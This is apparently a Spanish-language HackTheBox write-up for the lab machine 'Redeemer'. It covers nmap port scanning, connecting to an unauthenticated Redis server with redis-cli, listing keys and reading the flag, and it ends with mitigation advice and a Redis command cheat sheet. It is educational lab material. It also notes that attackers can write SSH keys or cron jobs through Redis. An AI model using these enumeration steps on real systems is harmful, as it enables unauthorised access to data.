---
layout: post
title: HTB — Redeemer
date: 2026-05-31
platform: HackTheBox
difficulty: very-easy
description: Redis sin autenticación expuesto a red
tags:
  - Redis
  - Linux
---

## Introducción

Redeemer presenta **Redis** — una base de datos en memoria extremadamente popular usada para caché, sesiones y colas de mensajes. En su configuración por defecto, Redis no requiere autenticación. Si el puerto queda expuesto a la red, cualquiera puede conectarse, leer todas las keys almacenadas y en muchos casos escribir archivos en el servidor.

Es el cierre del Tier 0 y el patrón es el mismo de siempre: servicio expuesto, sin autenticación, acceso directo.

---

## Reconocimiento

Verificamos conectividad:

```bash
ping -c 1 10.129.x.x
# -c 1    Envía solo 1 paquete ICMP
```

Descubrimiento de puertos:

```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.129.x.x -oG allports
# -p-          Escanea los 65535 puertos
# -sS          SYN scan (sigiloso, no completa el handshake TCP)
# --open       Muestra solo puertos abiertos
# --min-rate   Envía mínimo 5000 paquetes por segundo
# -vvv         Verbose: muestra resultados en tiempo real
# -n           Sin resolución DNS (más rápido)
# -Pn          Omite el host discovery (asume que el host está activo)
# -oG          Guarda el output en formato Grepable
```

Output relevante:

```
PORT     STATE SERVICE
6379/tcp open  redis
```

Un solo puerto. **6379**, el puerto estándar de Redis.

Escaneo de versiones y scripts:

```bash
nmap -sCV -p6379 10.129.x.x -oN target
# -sC       Ejecuta scripts de detección por defecto (NSE)
# -sV       Detecta versión del servicio
# -p6379    Escanea solo el puerto 6379
# -oN       Guarda el output en formato Normal (legible)
```

Output relevante:

```
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```

Redis 5.0.7 expuesto directamente a la red.

---

## Explotación

Me conecto directamente con `redis-cli` sin credenciales:

```bash
redis-cli -h 10.129.x.x
# -h    Host del servidor Redis
```

```
10.129.x.x:6379>
```

Conectado. Sin usuario, sin contraseña.

---

## Enumeración de Redis

```bash
# Verificar que el servidor responde
10.129.x.x:6379> ping
# PONG

# Ver información del servidor
10.129.x.x:6379> info server
# Muestra versión, OS, configuración

# Listar todas las keys almacenadas
10.129.x.x:6379> keys *
# 1) "flag"
# 2) "numb"
# 3) "temp"
```

La key `flag` es la candidata. Leo su valor:

```bash
10.129.x.x:6379> get flag
# "03e1d2b376c37ab3f5319922053953eb"
```

---

## ¿Qué aprendemos de esto?

**Redis sin autenticación es una vulnerabilidad crítica y frecuente.** En 2018 se estimó que más de 70,000 instancias de Redis estaban expuestas públicamente sin contraseña. Muchas de ellas fueron comprometidas para minería de criptomonedas o instalación de backdoors.

**Redis puede hacer más que leer datos.** Con acceso de escritura, un atacante puede usar Redis para escribir archivos en el sistema — incluyendo claves SSH autorizadas en `~/.ssh/authorized_keys` o cron jobs maliciosos. El impacto va mucho más allá de la exposición de datos.

**El puerto 6379 nunca debería estar expuesto a internet.** Redis está diseñado para correr en redes internas de confianza. La protección mínima es un firewall que restrinja el acceso al puerto, más `requirepass` en la configuración para requerir autenticación.

**El patrón del Tier 0 se completa aquí.** Meow (Telnet), Fawn (FTP), Dancing (SMB), Explosion (RDP), Preignition (HTTP), Mongod (MongoDB), Synced (rsync), Redeemer (Redis) — ocho servicios diferentes, el mismo vector: expuesto sin autenticación. La lección es universal.

---

## Comandos esenciales de Redis para CTF

```bash
# Conectarse al servidor
redis-cli -h <IP>
redis-cli -h <IP> -p <puerto>
redis-cli -h <IP> -a <password>    # con contraseña

# Dentro de redis-cli:
ping                    # verificar conexión
info                    # información completa del servidor
info server             # solo info del servidor
info keyspace           # bases de datos con keys
keys *                  # listar todas las keys
keys flag*              # listar keys que empiecen con "flag"
get <key>               # leer valor de una key
type <key>              # ver tipo de dato de una key
select <n>              # cambiar de base de datos (0-15)
dbsize                  # número de keys en la base de datos actual
config get *            # ver configuración del servidor
```

---

## Resumen técnico

| Elemento | Detalle |
|----------|---------|
| Puerto | 6379/tcp (Redis 5.0.7) |
| Vulnerabilidad | Redis sin autenticación accesible desde red |
| Acceso obtenido | Lectura completa de todas las keys |
| Herramientas | `nmap`, `redis-cli` |
| Mitigación | Habilitar autenticación (`requirepass` en redis.conf), restringir acceso por IP con firewall, nunca exponer Redis a internet, usar `bind 127.0.0.1` para escuchar solo en localhost |
